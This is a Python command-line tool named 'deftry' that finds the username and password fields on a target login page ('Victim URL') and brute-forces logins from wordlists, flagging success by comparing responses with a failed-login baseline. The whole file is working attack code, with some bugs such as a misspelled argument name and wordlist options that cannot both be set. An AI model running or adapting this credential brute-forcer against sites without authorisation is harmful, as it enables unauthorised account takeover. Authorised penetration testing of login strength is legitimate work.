#!/usr/bin/python3

import requests
import re
import argparse
import signal
from pwn import *
from replit import clear


# Global Variables

usrfielddic = "./wordlists/usermatch.txt"
passfielddic = "./wordlists/passwdmatch.txt"

class fg:
    BLACK   = '\033[30m'
    RED     = '\033[31m'
    GREEN   = '\033[32m'
    YELLOW  = '\033[33m'
    BLUE    = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN    = '\033[36m'
    WHITE   = '\033[37m'
    RESET   = '\033[39m'

oneliner = "                                         \r"


def parse_flags():
    parser = argparse.ArgumentParser(description='Default Credentials Checker')
    parser.add_argument('-u', required=True, help='URL', dest="url", metavar="[Victim URL]")
    parser.add_argument('-uw', required=False, help='Users Wordlist (Must be a list with value per line)', dest="inputuserdic", default=None, metavar="[/usr/share/example]")
    parser.add_argument('-pw', required=False, help='Password Wordlist (Must be a list with value per line)', dest="inputpassdic", default=None, metavar="[/usr/share/example]")
    parser.add_argument('-nc', required=False, help='No errors checks to compare', dest="nocheck", metavar="")
    args = parser.parse_args()
    return args


def conn(url, method, payload=None):
    if method == "post":
        r = requests.post(url, data=payload)
    elif method == "get":
        r = requests.get(url)
    return r


def make_payload(user_field="username", pwd_field="password", username="IfThisLoginIKillMyself", password="IfThisLoginIKillMyself"):
    payload = {
         f"{user_field}": f"{username}",
         f"{pwd_field}": f"{password}"
    }
    return payload


def read_dict(dic):
    dictlist = []
    with open(dic, "r") as dict:
        for line in dict:
            dictlist.append(line.replace("\n", ""))
        dict.close
    return dictlist


def match_field(field, dic):
    dict = read_dict(dic)
    for i in field:
        for n in dict:
            if i == n:
                matched_field = i
            else:
                continue
    return matched_field


def get_fields(args):
    p1 = log.progress(f'{fg.YELLOW}Searching login fields{fg.RESET}')
    url = args.url
    login = conn(url, "get")
    usr_field = re.findall(r"<input type=\"text\" name=\"(.*?)\"", login.text)
    pass_field = re.findall(r"<input type=\"password\" name=\"(.*?)\"", login.text)
    usr_field = match_field(usr_field, usrfielddic)
    pass_field = match_field(pass_field, passfielddic)
    if usr_field == None or pass_field == None:
        print(f"\n\n\n{fg.RED}[!] Cant find any good login field, sorry...\n{fg.RESET}"); exit(1)
    print(f'{fg.GREEN}Got the correct fields lucky bastard!: ' + f"\"{usr_field}\" & \"{pass_field}\"\n{fg.RESET}")
    return (usr_field, pass_field)

   
def get_error_values(response):
    error_chars = len(response.text)
    error_lines = len(response.text.splitlines())
    if response.status_code != 200 and not (301 <= response.status_code <= 308):
        error_response = response.status_code
    else:
        error_response = 401
    errors = {
        "chars": error_chars,
        "lines": error_lines,
        "response": error_response
    }
    return errors
    

def check_errors(r, errors):
    r_err = get_error_values(r)
    chars = abs(r_err["chars"] - errors["chars"])
    lines = abs(r_err["lines"] - errors["lines"])
    if chars > 20 or lines > 3 or r_err["response"] == errors["response"]:
        return False
    else:
        return True


def brute_force(usr_field, pass_field, url, usrdic, passdic, errors=None):
    p2 = log.progress(f'{fg.YELLOW}Applying brute force{fg.YELLOW}')
    userdict = read_dict(usrdic)
    passdict = read_dict(passdic)
    for user in userdict:
        for passw in passdict:
            payload = make_payload(usr_field, pass_field, user, passw)
            print(f'{fg.YELLOW}Trying {fg.RESET}' + f"{fg.RED}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}", end="")
            response = conn(url, "post", payload)
            print(oneliner, end="")
            if errors != None:
                if check_errors(response, errors) == True:
                    p2.status(f'{fg.GREEN}Gotcha!!{fg.RESET}')
                    print(f"{fg.GREEN}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}")
                    break
                else:
                    continue
            

def main():
    print(f"\n{fg.MAGENTA}[*] Welcome to deftry{fg.RESET}")
    print(f"{fg.MAGENTA}_{fg.RESET}" * 30 + "\n")
    args = parse_flags()
    usrdic = "./wordlists/usr.txt"
    passdic = "./wordlists/pass.txt"
    if args.inputuserdic:
        usrdic = args.inputuserdic
    elif args.inputpassdic:
        passdic = args.inputpassidc
    
    usr_field, pass_field = get_fields(args)
    if not args.nocheck:
        error_payload = make_payload(usr_field, pass_field)
        err_response = conn(args.url, "post", error_payload)
        errors = get_error_values(err_response)
    else:
        errors= None
    brute_force(usr_field, pass_field, args.url, usrdic, passdic, errors)


def def_handler(sig, frame):
	print(f"\n\n\n{fg.RED}[!] Saliendo...{fg.RESET}\n")
	exit(1)



if __name__ == "__main__":
    clear()
    signal.signal(signal.SIGINT, def_handler)
    main()